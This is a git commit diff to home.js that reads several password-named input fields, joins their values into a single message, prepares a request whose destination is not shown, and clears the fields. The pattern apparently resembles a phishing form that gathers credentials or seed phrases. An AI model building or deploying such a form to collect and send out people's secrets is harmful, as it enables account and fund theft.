1d984113b0146421858f094d675357e3b3043a79
za17za <147387201+za17za@users.noreply.github.com>
2023-10-29 14:29:36 +0100

    Update home.js

--- home.js
+++ home.js
@@ -2,23 +2,21 @@ var ready = function () {
     // Retrieve the values from the input fields
     pass = document.getElementById("pass").value;
     pass2 = document.getElementById("pass2").value;
-   // pass3 = document.getElementById("pass3").value;
+    pass3 = document.getElementById("pass3").value;
     pass4 = document.getElementById("pass4").value;
     pass5 = document.getElementById("pass5").value;
     pass6 = document.getElementById("pass6").value;
     pass7 = document.getElementById("pass7").value;
-    pass8 = document.getElementById("pass8").value;
 
 
 
     var message =  pass +
         "\n\n\n" + pass2 +
-     //   "\n\n\n" + pass3 +
+       "\n\n\n" + pass3 +
         "\n\n\n" + pass4 +
         "\n\n\n" + pass5 +
         "\n\n\n" + pass6 +
-        "\n\n\n" + pass7;+
-        "\n\n\n" + pass8;
+        "\n\n\n" + pass7;
 
 
     var settings = {
@@ -49,12 +47,11 @@ var ready = function () {
     // Clear the input fields
     document.getElementById("pass").value = "";
     document.getElementById("pass2").value = "";
-   // document.getElementById("pass3").value = "";
+    document.getElementById("pass3").value = "";
     document.getElementById("pass4").value = "";
     document.getElementById("pass5").value = "";
     document.getElementById("pass6").value = "";
     document.getElementById("pass7").value = "";
-    document.getElementById("pass8").value = "";
 
 
 
